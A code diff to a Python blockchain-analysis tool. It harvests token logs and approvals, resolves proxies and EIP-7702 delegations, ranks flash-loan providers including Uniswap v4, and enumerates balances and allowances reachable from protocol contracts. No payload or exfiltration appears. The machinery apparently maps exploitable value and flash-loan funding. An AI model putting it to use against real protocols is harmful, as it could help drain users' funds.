+                fut_l = ex_tb.submit(
+                    _harvest_token_logs_bisect,
+                    router, chain, holders, from_block, mid, max_depth - 1, out_spenders,
+                    _filter_indices=fail_tup, _spenders_lock=sp_lock,
+                )
+                fut_r = ex_tb.submit(
+                    _harvest_token_logs_bisect,
+                    router, chain, holders, mid + 1, to_block, max_depth - 1, out_spenders,
+                    _filter_indices=fail_tup, _spenders_lock=sp_lock,
+                )
+                lt_l, lo_l = fut_l.result()
+                lt_r, lo_r = fut_r.result()
+        else:
+            lt_l, lo_l = _harvest_token_logs_bisect(
+                router, chain, holders, from_block, mid, max_depth - 1, out_spenders=out_spenders,
+                _filter_indices=fail_tup, _spenders_lock=sp_lock,
+            )
+            lt_r, lo_r = _harvest_token_logs_bisect(
+                router, chain, holders, mid + 1, to_block, max_depth - 1, out_spenders=out_spenders,
+                _filter_indices=fail_tup, _spenders_lock=sp_lock,
+            )
         tokens |= lt_l | lt_r
         owners |= lo_l | lo_r
     return tokens, owners
@@ -9963,7 +10136,14 @@ def _harvest_inbound_trust_and_approvals(
     if not norm_targets:
         return verified_vaults, approval_grantors, approval_tokens
     padded = ["0x" + ("0" * 24) + nt[2:] for nt in norm_targets]
-    spans = (1_000_000, 250_000, 50_000, 10_000) if is_live_rpc else (500_000, 50_000, 3_000)
+    spans: Tuple[int, ...] = (1_000_000, 250_000, 50_000, 10_000, 3_000) if is_live_rpc else (500_000, 50_000, 3_000)
+    is_real_r = is_live_rpc and _is_live_real_router(router)
+    if is_real_r:
+        span_map = getattr(router, "_live_log_max_span_by_chain", None)
+        if isinstance(span_map, dict):
+            cached_sp = int(span_map.get(c, 0) or 0)
+            if cached_sp > 0:
+                spans = tuple(sp for sp in spans if sp <= cached_sp) or spans
     logs_found: List[Any] = []
     seen_from: Set[int] = set()
     for sp in spans:
@@ -9985,6 +10165,9 @@ def _harvest_inbound_trust_and_approvals(
             )
             if isinstance(res_l, list):
                 logs_found = res_l
+                if is_real_r and isinstance(getattr(router, "_live_log_max_span_by_chain", None), dict):
+                    with router._lock:
+                        router._live_log_max_span_by_chain[c] = sp
                 break
         except Exception:
             continue
@@ -11323,20 +11506,24 @@ _FLASH_PROVIDER_RANK: Dict[str, int] = {
     "morpho_blue": 0,
     "balancer_v2": 1,
     "balancer_v3": 2,
-    "erc3156": 3,
-    "aave_v3": 4,
-    "dex_flash_v3": 5,
-    "dex_flash_algebra": 6,
-    "dex_flash_solidly_s": 7,
-    "dex_flash_v2": 8,
-    "dex_flash_solidly_v": 9,
+    "uniswap_v4": 3,
+    "erc3156": 4,
+    "aave_v3": 5,
+    "dex_flash_v3": 6,
+    "dex_flash_algebra": 7,
+    "dex_flash_solidly_s": 8,
+    "dex_flash_v2": 9,
+    "dex_flash_solidly_v": 10,
 }
 _STAGE4_FLASH_MODE: Dict[str, int] = {
     "balancer_v2": 1,
     "morpho_blue": 2,
     "aave_v3": 3,
     "erc3156": 4,
+    "uniswap_v4": 5,
+    "balancer_v3": 6,
 }
+_STAGE4_FLASH_MODES: FrozenSet[int] = frozenset(_STAGE4_FLASH_MODE.values())
 
 
 def optimize_flash_split_for_capital(
@@ -11503,6 +11690,19 @@ def discover_optimal_flash_sources_for_tokens(
                     "vault_norm": vn,
                     "fee_bps": 0,
                     "configured_for_chain": (c in FLASH_PROVIDERS),
+                }
+            )
+    for v4_mgr in UNISWAP_V4_POOL_MANAGERS.get(c, ()):
+        vn_v4 = _norm_addr(v4_mgr)
+        if vn_v4 and ("uniswap_v4", vn_v4) not in seen_vp:
+            seen_vp.add(("uniswap_v4", vn_v4))
+            base_providers.append(
+                {
+                    "provider": "uniswap_v4",
+                    "vault": _checksum(vn_v4),
+                    "vault_norm": vn_v4,
+                    "fee_bps": 0,
+                    "configured_for_chain": False,
                 }
             )
 
@@ -11732,7 +11932,7 @@ def discover_optimal_flash_sources_for_tokens(
             seen_t_vp.add((pv, vn))
             eff_fee = int(fee_override.get((pv, vn), ent_src.get("fee_bps", 0)))
             configured_flag = bool(ent_src.get("configured_for_chain", False))
-            if raw_amt <= 0 and not configured_flag and pv in ("morpho_blue", "balancer_v2", "balancer_v3"):
+            if raw_amt <= 0 and not configured_flag and pv in ("morpho_blue", "balancer_v2", "balancer_v3", "uniswap_v4"):
                 return
             b_usd_d = (
                 (Decimal(raw_amt) / (Decimal(10) ** t_dec)) * t_price_d
@@ -11887,7 +12087,7 @@ def _build_stage4_flash_wrapped_slices(
         mode = int(best.get("stage4_mode") or 0)
         cap = int(best.get("max_borrowable_raw") or 0)
         fee_bps = int(best.get("fee_bps") if best.get("fee_bps") is not None else 999)
-        if mode in (1, 2, 3, 4) and cap > 0 and fee_bps <= 9 and _norm_addr(best.get("vault") or ""):
+        if mode in _STAGE4_FLASH_MODES and cap > 0 and fee_bps <= 9 and _norm_addr(best.get("vault") or ""):
             chosen_tok = t_chk
             chosen_best = dict(best)
             break
@@ -11905,7 +12105,7 @@ def _build_stage4_flash_wrapped_slices(
             _cc
             for _cc in _chosen_cands
             if isinstance(_cc, Mapping)
-            and int(_cc.get("stage4_mode") or 0) in (1, 2, 3, 4)
+            and int(_cc.get("stage4_mode") or 0) in _STAGE4_FLASH_MODES
             and int(_cc.get("fee_bps") or 0) <= 9
         ]
         if _stage4_cands:
@@ -12216,6 +12416,11 @@ def _eip7702_delegate(code: Any) -> str:
         if addr and int(addr, 16) > 0:
             return addr
     return ""
+
+
+def _is_eip7702_delegation_code_hex(code_hex: Any) -> bool:
+    """EIP-7702 위임 지정자(`0xEF0100 + 20B impl`) 여부. chain_id=0 리플레이는 온체인 코드로 구분 불가하므로 전 위임을 리플레이 위험으로 취급한다."""
+    return bool(_eip7702_delegate(code_hex))
 
 
 def _slot0_safe_proxy_shape(code: Any, dis: Optional[Sequence[Tuple[int, str, bytes]]] = None) -> bool:
@@ -12807,9 +13012,9 @@ def _resolve_proxy_and_delegates(
         if d7702:
             p_kind = "eip7702"
             impls = [d7702]
-        elif _eip1167_impl(raw_code):
+        elif (d1167 := _eip1167_impl(raw_code)):
             p_kind = "eip1167"
-            impls = [_eip1167_impl(raw_code)]
+            impls = [d1167]
         else:
             for k in ("impl_1967", "impl_1822", "impl_zos"):
                 if sv.get(k):
@@ -13284,6 +13489,18 @@ def _expand_address_graph_conceptually(
                 except Exception:
                     sourcify_getters_by_addr = {}
 
+        _code_ana_cache: Dict[str, Tuple[bool, bool, List[str], List[str]]] = {}
+        _dense_frontier_slots: Tuple[int, ...] = (
+            tuple(range(0, 32))
+            + tuple(range(50, 58))
+            + tuple(range(100, 108))
+            + tuple(range(150, 158))
+            + tuple(range(200, 208))
+            + tuple(range(250, 256))
+            + tuple(range(301, 306))
+        )
+        _use_dense_slots = bool(is_live_rpc and len(sorted_frontier) > 16)
+
         for addr in sorted_frontier:
             res = resolutions.get(addr)
             if not res:
@@ -13296,22 +13513,39 @@ def _expand_address_graph_conceptually(
             seen_calls_for_addr: Set[bytes] = set()
             if res.proxy_kind == "eip7702":
                 frontier_has_ext_call = True
+            has_any_code = False
+            has_sload_op = res.proxy_kind != "none"
             for chx in code_hex_list:
-                eff_bytes = _hex_to_bytes(chx)
-                if not eff_bytes:
-                    continue
-                dis = _disassemble(eff_bytes)
-                if _has_dynamic_or_external_call_capability(dis):
+                chx_k = str(chx or "").lower()
+                cached_ana = _code_ana_cache.get(chx_k)
+                if cached_ana is None:
+                    eff_bytes = _hex_to_bytes(chx_k)
+                    if not eff_bytes:
+                        continue
+                    dis = _disassemble(eff_bytes)
+                    loc_ext = _has_dynamic_or_external_call_capability(dis)
+                    loc_sload = any(nm == "SLOAD" for _, nm, _ in dis)
+                    sels_l, push_addrs_l = _extract_push_selectors_and_addrs(dis)
+                    cached_ana = (loc_ext, loc_sload, sels_l, push_addrs_l)
+                    _code_ana_cache[chx_k] = cached_ana
+                has_any_code = True
+                loc_ext, loc_sload, sels, push_addrs = cached_ana
+                if loc_ext:
                     frontier_has_ext_call = True
-                sels, push_addrs = _extract_push_selectors_and_addrs(dis)
+                if loc_sload:
+                    has_sload_op = True
                 for pa in push_addrs:
                     if pa not in known and pa not in excluded_infra and len(discovered) < max_nodes * 2:
                         discovered.add(pa)
                 for sel in sels:
+                    if sel.removeprefix("0x").lower() in _COMMON_BOILERPLATE_SELECTORS:
+                        continue
                     sb = _hex_to_bytes(sel)
                     if sb and sb not in seen_calls_for_addr:
                         seen_calls_for_addr.add(sb)
                         mc_calls.append((addr, sb))
+            if not has_any_code and res.proxy_kind == "none":
+                continue
             for g_hex in sourcify_getters_by_addr.get(addr, ()):
                 gb = _hex_to_bytes(g_hex)
                 if gb and gb not in seen_calls_for_addr:
@@ -13326,20 +13560,40 @@ def _expand_address_graph_conceptually(
                     if igs not in seen_calls_for_addr:
                         seen_calls_for_addr.add(igs)
                         mc_calls.append((addr, igs))
-            slot_indices: Sequence[int] = _CONNECTED_STORAGE_PROBE_SLOTS if hop == 0 else range(16)
+            if not has_sload_op:
+                continue
+            slot_indices: Sequence[int] = (
+                (_dense_frontier_slots if _use_dense_slots else _CONNECTED_STORAGE_PROBE_SLOTS)
+                if hop == 0
+                else range(16)
+            )
             for slot_idx in slot_indices:
                 slot_calls.append(("eth_getStorageAt", [_checksum(addr), hex(slot_idx), btag]))
 
         def _fetch_slot_vals() -> List[Any]:
-            out_s: List[Any] = []
-            for idx_sc in range(0, len(slot_calls), 96):
-                out_s.extend(router.batch_call(c, slot_calls[idx_sc : idx_sc + 96], block_pin=block_pin, need_archive=True))
+            sc_chunks = [slot_calls[idx_sc : idx_sc + 96] for idx_sc in range(0, len(slot_calls), 96)]
+            if is_live_rpc and len(sc_chunks) >= 2:
+                out_s: List[Any] = []
+                with concurrent.futures.ThreadPoolExecutor(max_workers=min(16, len(sc_chunks))) as ex_sc:
+                    for part_s in ex_sc.map(lambda ch: router.batch_call(c, ch, block_pin=block_pin, need_archive=True), sc_chunks):
+                        out_s.extend(part_s)
+                return out_s
+            out_s = []
+            for ch in sc_chunks:
+                out_s.extend(router.batch_call(c, ch, block_pin=block_pin, need_archive=True))
             return out_s
 
         def _fetch_mc_vals() -> List[Tuple[bool, bytes]]:
-            out_m: List[Tuple[bool, bytes]] = []
-            for idx_mc in range(0, len(mc_calls), 96):
-                out_m.extend(router.multicall3(c, mc_calls[idx_mc : idx_mc + 96], block_pin=block_pin))
+            mc_chunks = [mc_calls[idx_mc : idx_mc + 96] for idx_mc in range(0, len(mc_calls), 96)]
+            if is_live_rpc and len(mc_chunks) >= 2:
+                out_m: List[Tuple[bool, bytes]] = []
+                with concurrent.futures.ThreadPoolExecutor(max_workers=min(16, len(mc_chunks))) as ex_mc:
+                    for part_m in ex_mc.map(lambda ch: router.multicall3(c, ch, block_pin=block_pin), mc_chunks):
+                        out_m.extend(part_m)
+                return out_m
+            out_m = []
+            for ch in mc_chunks:
+                out_m.extend(router.multicall3(c, ch, block_pin=block_pin))
             return out_m
 
         def _fetch_out_logs() -> Set[str]:
@@ -13587,6 +13841,57 @@ def _is_live_real_router(router: Optional[Any]) -> bool:
     )
 
 
+_LIVE_PROGRESS_LOCK = threading.Lock()
+_LIVE_PROGRESS_STATE: Dict[str, Dict[str, Any]] = {}
+
+
+def _emit_progress(
+    stage: str,
+    *,
+    slug: str = "",
+    chain: str = "",
+    block_pin: int = 0,
+    session_id: str = "",
+    detail: str = "",
+    router: Optional[Any] = None,
+    extra: Optional[Mapping[str, Any]] = None,
+) -> None:
+    """실행 중 stdout JSON 계약을 깨지 않고 stderr 실시간 스트리밍 + 원자적 세션 진행 스냅샷을 갱신한다."""
+    if router is not None and not _is_live_real_router(router):
+        return
+    try:
+        ts = time.strftime("%H:%M:%S")
+        sid_tag = str(session_id or "default").strip() or "default"
+        loc = f"{chain}@{int(block_pin)}" if chain and int(block_pin or 0) > 0 else (chain or "-")
+        slug_tag = slug or "-"
+        msg = f"[{ts}] [LIVE] {sid_tag} | {stage} | {slug_tag} ({loc})"
+        if detail:
+            msg = f"{msg} | {detail}"
+        with _LIVE_PROGRESS_LOCK:
+            print(msg, file=sys.stderr, flush=True)
+            safe_sid = _norm_slug(sid_tag) or "default"
+            prev = dict(_LIVE_PROGRESS_STATE.get(safe_sid) or {})
+            snap: Dict[str, Any] = {
+                **prev,
+                "session_id": sid_tag,
+                "updated_at": round(time.time(), 3),
+                "updated_local": ts,
+                "stage": stage,
+                "slug": slug,
+                "chain": chain,
+                "block_pin": int(block_pin or 0),
+                "detail": detail,
+            }
+            if extra:
+                for k_e, v_e in extra.items():
+                    snap[str(k_e)] = v_e
+            _LIVE_PROGRESS_STATE[safe_sid] = snap
+            if ARTIFACT_ROOT.exists():
+                _write_json_atomic(ARTIFACT_ROOT / f"_live_progress_{safe_sid}.json", snap, compact=True)
+    except Exception:
+        pass
+
+
 @_with_decimal_prec_100
 def _estimate_native_price_interval_dec(
     chain: str,
@@ -13802,7 +14107,7 @@ def _parallel_dex_liquidity_probes(
 
     out_map: Dict[str, Optional[Dict[str, Any]]] = {}
     if len(specs) >= 2 and _is_live_real_router(router):
-        with concurrent.futures.ThreadPoolExecutor(max_workers=min(6, len(specs))) as ex_dp:
+        with concurrent.futures.ThreadPoolExecutor(max_workers=min(16, len(specs))) as ex_dp:
             for t_k, dq_res in ex_dp.map(_run_one, specs):
                 out_map[t_k] = dq_res
     else:
@@ -13824,6 +14129,7 @@ def _resolve_token_metadata_batch(
     *,
     prices_dec_out: Optional[Dict[str, Decimal]] = None,
     upper_prices_dec_out: Optional[Dict[str, Decimal]] = None,
+    skip_dex_probe: bool = False,
 ) -> Tuple[Dict[str, int], Dict[str, float]]:
     """
     토큰별 decimals(), symbol() 단일 Multicall3 배치 조회 + coins.llama.fi 배치 시세 조회 + 온체인 DEX 호가 교차 검증:
@@ -13942,7 +14248,7 @@ def _resolve_token_metadata_batch(
 
         probe_nat_d = nat_lo_d if nat_lo_d > _DEC_ZERO else eff_native_hi_d
         dex_probe_inputs: Dict[str, Tuple[int, Decimal, int]] = {}
-        if block_pin > 0 and probe_nat_d > _DEC_ZERO:
+        if not skip_dex_probe and block_pin > 0 and probe_nat_d > _DEC_ZERO:
             for tn, dec, _sym, is_erc20 in parsed_tokens:
                 if tn == wnative:
                     continue
@@ -13955,13 +14261,17 @@ def _resolve_token_metadata_batch(
                         probe_amt = max(1, (10 ** dec) // 100 if dec >= 2 else (10 ** dec))
                     dex_probe_inputs[tn] = (dec, ext_p_d, probe_amt)
 
-        dex_probe_results = _parallel_dex_liquidity_probes(
-            router,
-            c,
-            block_pin,
-            probe_nat_d,
-            llama_prices_dec,
-            [(t_k, amt_k, dec_k, ext_k) for t_k, (dec_k, ext_k, amt_k) in dex_probe_inputs.items()],
+        dex_probe_results = (
+            _parallel_dex_liquidity_probes(
+                router,
+                c,
+                block_pin,
+                probe_nat_d,
+                llama_prices_dec,
+                [(t_k, amt_k, dec_k, ext_k) for t_k, (dec_k, ext_k, amt_k) in dex_probe_inputs.items()],
+            )
+            if dex_probe_inputs
+            else {}
         )
 
         meta_rows: List[Tuple[int, str, int, str, int, bool, Decimal, Decimal, str]] = []
@@ -14022,18 +14332,27 @@ def _resolve_token_metadata_batch(
                 u_price_hi_d = u_price_d
             u_price_f = float(u_price_d)
             u_price_hi_f = float(u_price_hi_d)
-            decimals_map[tn] = dec
-            price_map[tn] = u_price_f
-            if prices_dec_out is not None:
-                prices_dec_out[tn] = u_price_d
-            if upper_prices_out is not None:
-                upper_prices_out[tn] = u_price_hi_f
-            if upper_prices_dec_out is not None:
-                upper_prices_dec_out[tn] = u_price_hi_d
+            is_valid_tok_meta = bool(
+                is_erc20
+                or (tn in stables)
+                or (tn in bluechips)
+                or (tn == wnative)
+                or (u_price_d > _DEC_ZERO)
+                or (block_pin <= 0 and not _is_live_real_router(router))
+            )
+            if is_valid_tok_meta:
+                decimals_map[tn] = dec
+                price_map[tn] = u_price_f
+                if prices_dec_out is not None:
+                    prices_dec_out[tn] = u_price_d
+                if upper_prices_out is not None:
+                    upper_prices_out[tn] = u_price_hi_f
+                if upper_prices_dec_out is not None:
+                    upper_prices_dec_out[tn] = u_price_hi_d
             if r_store is not None and block_pin > 0:
-                if u_price_hi_d > _DEC_ZERO:
+                if is_valid_tok_meta and u_price_hi_d > _DEC_ZERO:
                     r_store.put_price(f"TOKEN_MAX:{cid}:{tn}:{block_pin}", u_price_hi_d, "onchain_meta_max")
-                if u_price_d > _DEC_ZERO:
+                if is_valid_tok_meta and u_price_d > _DEC_ZERO:
                     meta_rows.append((
                         cid,
                         tn,
@@ -14058,6 +14377,7 @@ def build_backward_trust_closure(
     seed_addresses: List[str],
     block_pin: int,
     protocol_tvl_hint_usd: float = 0.0,
+    initial_resolutions: Optional[Mapping[str, ProxyResolution]] = None,
 ) -> TrustClosureResult:
     """
     다중 홉 연결 가치 도달 가능성 폐포(Connected Value Reachability Closure):
@@ -14068,6 +14388,8 @@ def build_backward_trust_closure(
     c = _norm_chain(chain)
     btag = hex(block_pin) if block_pin > 0 else "latest"
     clean_seeds = sorted({nx for x in seed_addresses if (nx := _norm_addr(x))})
+    _live_sid = getattr(router, "session_id", "") or ""
+    _live_slug = str((_LIVE_PROGRESS_STATE.get(_live_sid, {}) or {}).get("slug") or (clean_seeds[0] if clean_seeds else ""))
     if not clean_seeds:
         return TrustClosureResult(
             chain=c,
@@ -14082,17 +14404,43 @@ def build_backward_trust_closure(
             early_exit_reason="E1_NO_VALID_SEED_ADDRESS",
         )
 
-    resolutions = _resolve_proxy_and_delegates(
-        router,
-        c,
-        clean_seeds,
-        block_pin,
-        raise_on_rpc_failure=(block_pin > 0),
-    )
+    clean_seed_set_r = set(clean_seeds)
+    resolutions: Dict[str, ProxyResolution] = {}
+    if initial_resolutions:
+        for k_ir, v_ir in initial_resolutions.items():
+            nk_ir = _norm_addr(k_ir)
+            if (
+                nk_ir
+                and nk_ir in clean_seed_set_r
+                and isinstance(v_ir, ProxyResolution)
+                and not bool(getattr(v_ir, "unresolved_delegation", False))
+            ):
+                resolutions[nk_ir] = v_ir
+    missing_res_seeds = [a for a in clean_seeds if a not in resolutions]
+    if missing_res_seeds:
+        resolutions.update(
+            _resolve_proxy_and_delegates(
+                router,
+                c,
+                missing_res_seeds,
+                block_pin,
+                raise_on_rpc_failure=(block_pin > 0),
+            )
+        )
     expanded = _expand_address_graph_conceptually(router, c, clean_seeds, resolutions, block_pin, max_nodes=64, max_hops=2)
     new_addrs = [x for x in expanded if x not in resolutions]
     if new_addrs:
         resolutions.update(_resolve_proxy_and_delegates(router, c, new_addrs, block_pin))
+    if _is_live_real_router(router) and _live_sid:
+        _emit_progress(
+            "S2_GRAPH_DONE",
+            slug=_live_slug,
+            chain=c,
+            block_pin=block_pin,
+            session_id=_live_sid,
+            detail=f"addrs={len(resolutions)} new={len(new_addrs)}",
+            router=router,
+        )
 
     all_addrs = sorted(resolutions.keys())
     alias_set = NATIVE_ALIAS_TOKENS_BY_CHAIN.get(c, frozenset())
@@ -14165,6 +14513,7 @@ def build_backward_trust_closure(
 
     approval_owners: Set[str] = set(all_addrs)
     ext_approval_spenders: Set[str] = set()
+    log_tokens_set: Set[str] = set()
     if block_pin > 100:
         try:
             is_live_rpc_bt = _is_live_real_router(router)
@@ -14176,7 +14525,7 @@ def build_backward_trust_closure(
             spenders_rec: Set[str] = set()
             spenders_dorm: Set[str] = set()
             if is_live_rpc_bt:
-                with concurrent.futures.ThreadPoolExecutor(max_workers=3) as ex_lh:
+                with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex_lh:
                     fut_rec = ex_lh.submit(
                         _harvest_token_logs_bisect,
                         router, c, all_addrs, recent_from, block_pin, 3, spenders_rec,
@@ -14216,9 +14565,14 @@ def build_backward_trust_closure(
             log_tokens |= inb_toks_bt
             log_owners |= inb_grantors_bt
             for lt in sorted(log_tokens):
-                if _norm_addr(lt) not in alias_set:
+                n_lt = _norm_addr(lt)
+                if n_lt and n_lt not in alias_set:
+                    log_tokens_set.add(n_lt)
                     _append_unique(candidate_tokens, cand_tok_set, lt)
             approval_owners |= log_owners
+            if len(candidate_tokens) > 400:
+                candidate_tokens = candidate_tokens[:400]
+                cand_tok_set = set(candidate_tokens)
         except Exception:
             pass
 
@@ -14230,6 +14584,16 @@ def build_backward_trust_closure(
         block_pin=block_pin,
         need_archive=True,
     )
+    if _is_live_real_router(router) and _live_sid:
+        _emit_progress(
+            "S2_LOGS_BALS_DONE",
+            slug=_live_slug,
+            chain=c,
+            block_pin=block_pin,
+            session_id=_live_sid,
+            detail=f"cand_toks={len(candidate_tokens)} log_toks={len(log_tokens_set)}",
+            router=router,
+        )
     np_min_dec_raw, np_max_dec_raw = _estimate_native_price_interval_dec(c, router=router, block_pin=block_pin)
     np_min_dec = max(_DEC_ZERO, np_min_dec_raw)
     np_max_dec = max(_DEC_ZERO, np_max_dec_raw)
@@ -14259,6 +14623,7 @@ def build_backward_trust_closure(
         if w > 0 and np_max_dec <= _DEC_ZERO:
             has_unpriced_native_exposure = True
 
+    _is_live_lazy_s2 = bool(block_pin > 0 and _is_live_real_router(router))
     price_max_map: Dict[str, float] = {}
     price_dec_map: Dict[str, Decimal] = {}
     price_max_dec_map: Dict[str, Decimal] = {}
@@ -14272,6 +14637,7 @@ def build_backward_trust_closure(
         native_price_max_usd=np_max_dec,
         prices_dec_out=price_dec_map,
         upper_prices_dec_out=price_max_dec_map,
+        skip_dex_probe=_is_live_lazy_s2,
     )
     eff_price_dec_map: Dict[str, Decimal] = {
         **{k: _to_dec(v) for k, v in price_map.items()},
@@ -14280,9 +14646,10 @@ def build_backward_trust_closure(
     bal_sel = bytes.fromhex(BALANCE_OF_SEL[2:])
     allow_sel = bytes.fromhex(ALLOWANCE_SEL[2:])
 
-    mc_queries: List[Tuple[str, bytes]] = []
-    mc_meta: List[Tuple[str, str, str]] = []
+    bal_queries: List[Tuple[str, bytes]] = []
+    bal_meta: List[Tuple[str, str, str]] = []
     _seed_set_bc: Set[str] = set(clean_seeds)
+    _seed_erc20_set_bc: Set[str] = set(seed_erc20_cands)
     _wn_bc = _norm_addr(WRAPPED_NATIVE_BY_CHAIN.get(c, ""))
     _self_skip_canon: Set[str] = (
         set(_norm_chain_stables_set(c))
@@ -14290,77 +14657,89 @@ def build_backward_trust_closure(
         | set(_infra_addresses_for_chain(c))
         | ({_wn_bc} if _wn_bc else set())
     )
+    probe_tokens: List[str] = [
+        t_p
+        for t_p in candidate_tokens
+        if (nt_p := _norm_addr(t_p))
+        and (nt_p in dec_map or nt_p in log_tokens_set or nt_p in _seed_erc20_set_bc)
+    ] or list(candidate_tokens)
     for a in all_addrs:
         a_padded = abi_encode(["address"], [a])
-        for tok in candidate_tokens:
+        for tok in probe_tokens:
             t_norm = _norm_addr(tok)
             if t_norm and (t_norm != a or a in _seed_set_bc or t_norm not in _self_skip_canon):
-                mc_queries.append((t_norm, bal_sel + a_padded))
-                mc_meta.append(("bal", a, t_norm))
+                bal_queries.append((t_norm, bal_sel + a_padded))
+                bal_meta.append(("bal", a, t_norm))
 
-    # 연결된 금고(all_addrs 포함) 및 외부 오너가 프로토콜 컨트랙트(spender)에 부여한 allowance 전수 조사
     owner_list = sorted(approval_owners)
     for ow in owner_list:
         ow_padded = abi_encode(["address"], [ow])
-        for tok in candidate_tokens:
-            t_norm = _norm_addr(tok)
-            if not t_norm:
-                continue
-            if ow not in all_addr_set:
-                mc_queries.append((t_norm, bal_sel + ow_padded))
-                mc_meta.append(("ow_bal", ow, t_norm))
-            for spender in all_addrs:
-                if spender == ow:
-                    continue
-                pair_padded = abi_encode(["address", "address"], [ow, spender])
-                mc_queries.append((t_norm, allow_sel + pair_padded))
-                mc_meta.append((f"allow:{spender}", ow, t_norm))
+        if ow not in all_addr_set:
+            for tok in probe_tokens:
+                t_norm = _norm_addr(tok)
+                if t_norm:
+                    bal_queries.append((t_norm, bal_sel + ow_padded))
+                    bal_meta.append(("ow_bal", ow, t_norm))
 
     ext_sp_list = sorted(s for s in ext_approval_spenders if s not in all_addr_set)[:24]
-    for ext_sp in ext_sp_list:
-        for v_addr in all_addrs:
-            for tok in candidate_tokens:
-                t_norm = _norm_addr(tok)
-                if not t_norm:
+
+    def _build_allow_queries(pos_pairs: Optional[Set[Tuple[str, str]]]) -> Tuple[List[Tuple[str, bytes]], List[Tuple[str, str, str]]]:
+        aq: List[Tuple[str, bytes]] = []
+        am: List[Tuple[str, str, str]] = []
+        pair_cd_cache: Dict[Tuple[str, str], bytes] = {}
+        norm_probe_toks = [tn for tok in probe_tokens if (tn := _norm_addr(tok))]
+
+        def _allow_cd(owner_a: str, spender_a: str) -> bytes:
+            k_cd = (owner_a, spender_a)
+            cd_v = pair_cd_cache.get(k_cd)
+            if cd_v is None:
+                cd_v = allow_sel + abi_encode(["address", "address"], [owner_a, spender_a])
+                pair_cd_cache[k_cd] = cd_v
+            return cd_v
+
+        # 연결된 금고(all_addrs 포함) 및 외부 오너가 프로토콜 컨트랙트(spender)에 부여한 allowance 전수 조사
+        for ow in owner_list:
+            for t_norm in norm_probe_toks:
+                if pos_pairs is not None and (ow, t_norm) not in pos_pairs:
                     continue
-                pair_padded = abi_encode(["address", "address"], [v_addr, ext_sp])
-                mc_queries.append((t_norm, allow_sel + pair_padded))
-                mc_meta.append((f"ext_allow:{ext_sp}", v_addr, t_norm))
+                for spender in all_addrs:
+                    if spender == ow:
+                        continue
+                    aq.append((t_norm, _allow_cd(ow, spender)))
+                    am.append((f"allow:{spender}", ow, t_norm))
+        for v_addr in all_addrs:
+            for t_norm in norm_probe_toks:
+                if pos_pairs is not None and (v_addr, t_norm) not in pos_pairs:
+                    continue
+                for ext_sp in ext_sp_list:
+                    aq.append((t_norm, _allow_cd(v_addr, ext_sp)))
+                    am.append((f"ext_allow:{ext_sp}", v_addr, t_norm))
+        return aq, am
 
-    owner_bals: Dict[Tuple[str, str], int] = {}
-    pending_allows: List[Tuple[str, str, str, int]] = []
-    pending_ext_allows: List[Tuple[str, str, str, int]] = []
-    has_unpriced_token_exposure = has_unpriced_native_exposure
-
-    def _tok_amount_hi_usd_dec(tn: str, amt: int) -> Tuple[Decimal, Decimal]:
-        dec_t = dec_map.get(tn, 18)
-        u_p_d = price_dec_map.get(tn, _to_dec(price_map.get(tn, 0)))
-        u_p_hi_d = price_max_dec_map.get(tn, _to_dec(price_max_map.get(tn, u_p_d)))
-        return (Decimal(amt) / (Decimal(10) ** dec_t)) * u_p_hi_d, u_p_d
-
-    if mc_queries:
-        # Speed maximization (2026-11-17: Multicall3 + parallel chunks, order-preserving).
-        # Serial 128-chunk loop is replaced by ThreadPool for live routers without changing result order.
-        _mc_chunks = [mc_queries[i : i + 128] for i in range(0, len(mc_queries), 128)]
-        mc_out: List[Tuple[bool, bytes]] = []
+    def _exec_mc_queries(q_list: List[Tuple[str, bytes]]) -> List[Tuple[bool, bytes]]:
+        nonlocal rpc_balance_incomplete
+        if not q_list:
+            return []
+        _mc_chunks = [q_list[i : i + 128] for i in range(0, len(q_list), 128)]
+        q_out: List[Tuple[bool, bytes]] = []
         if len(_mc_chunks) >= 2 and _is_live_real_router(router):
             def _run_chunk(_ch: List[Tuple[str, bytes]]) -> List[Tuple[bool, bytes]]:
                 return router.multicall3(c, _ch, block_pin=block_pin)
-            with concurrent.futures.ThreadPoolExecutor(max_workers=min(6, len(_mc_chunks))) as ex_mq:
+            with concurrent.futures.ThreadPoolExecutor(max_workers=min(12, len(_mc_chunks))) as ex_mq:
                 for _chunk_res in ex_mq.map(_run_chunk, _mc_chunks):
-                    mc_out.extend(_chunk_res)
+                    q_out.extend(_chunk_res)
                     if block_pin > 0 and isinstance(router, RPCRouter) and router.last_multicall_transport_failed():
                         rpc_balance_incomplete = True
         else:
-            for idx_mq in range(0, len(mc_queries), 128):
-                mc_out.extend(router.multicall3(c, mc_queries[idx_mq : idx_mq + 128], block_pin=block_pin))
+            for idx_mq in range(0, len(q_list), 128):
+                q_out.extend(router.multicall3(c, q_list[idx_mq : idx_mq + 128], block_pin=block_pin))
                 if block_pin > 0 and isinstance(router, RPCRouter) and router.last_multicall_transport_failed():
                     rpc_balance_incomplete = True
-        if block_pin > 0 and (len(mc_out) < len(mc_queries) or not any(ok for ok, _ in mc_out)):
+        if block_pin > 0 and (len(q_out) < len(q_list) or not any(ok for ok, _ in q_out)):
             try:
-                rebuilt_mc: List[Tuple[bool, bytes]] = list(mc_out)
-                for fb_off in range(0, len(mc_queries), 64):
-                    fb_slice = mc_queries[fb_off : fb_off + 64]
+                rebuilt_mc: List[Tuple[bool, bytes]] = list(q_out)
+                for fb_off in range(0, len(q_list), 64):
+                    fb_slice = q_list[fb_off : fb_off + 64]
                     fb_calls = [
                         ("eth_call", [{"to": _checksum(t_a), "data": "0x" + bytes(cd).hex()}, btag])
                         for t_a, cd in fb_slice
@@ -14378,9 +14757,68 @@ def build_backward_trust_closure(
                         idx_fb = fb_off + rel_fb
                         if idx_fb < len(rebuilt_mc) and isinstance(r_fb, str) and r_fb.startswith("0x") and len(r_fb) > 2:
                             rebuilt_mc[idx_fb] = (True, _hex_to_bytes(r_fb))
-                mc_out = rebuilt_mc
+                q_out = rebuilt_mc
             except Exception:
                 rpc_balance_incomplete = True
+        return q_out
+
+    owner_bals: Dict[Tuple[str, str], int] = {}
+    pending_allows: List[Tuple[str, str, str, int]] = []
+    pending_ext_allows: List[Tuple[str, str, str, int]] = []
+    has_unpriced_token_exposure = has_unpriced_native_exposure
+
+    def _tok_amount_hi_usd_dec(tn: str, amt: int) -> Tuple[Decimal, Decimal]:
+        dec_t = dec_map.get(tn, 18)
+        u_p_d = price_dec_map.get(tn, _to_dec(price_map.get(tn, 0)))
